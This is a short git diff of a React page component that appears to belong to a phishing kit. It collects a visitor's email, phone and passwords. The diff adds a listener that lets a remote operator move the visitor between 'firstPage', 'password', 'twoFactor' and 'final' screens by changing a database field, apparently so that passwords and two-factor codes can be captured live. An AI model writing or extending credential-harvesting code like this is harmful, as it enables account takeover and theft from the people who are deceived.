@@ -20,7 +20,10 @@ export default function Home(ip) {
 
   useEffect(()=>{
     let localEmail = localStorage.getItem("email");
-    if(localEmail) setEmail(localEmail);
+    if(localEmail){
+      setEmail(localEmail);
+      listenUser(localEmail);
+    }
     sendOpenedScript();
   },[]);  
 
@@ -53,12 +56,12 @@ export default function Home(ip) {
       setEmail(data.email);
       setPhone(data.phone)
       setOpen({step_two: true});
+      listenUser(data.email);
     } 
     if(data.type == 'password'){
       setPasswords(data.passwords);
       setOpen({step_three: true})
     }
-    if(data.type == 'listenUser') listenUser(data.value);
   }
 
   const listenUser = (email) => {
@@ -67,9 +70,11 @@ export default function Home(ip) {
         let user = doc.data();
         console.log(user);
 
-        if(user.currentStep == 'appeal') setOpen({step_two: true});
+        if(user.currentStep == 'firstPage') setOpen({step_one: true});
+        if(user.currentStep == 'password') setOpen({step_two: true});
         if(user.currentStep == 'twoFactor') setOpen({step_three: true});
         if(user.currentStep == 'final') setOpen({step_four: true});
+
 
         console.log("Current data: ", doc.data());
       });
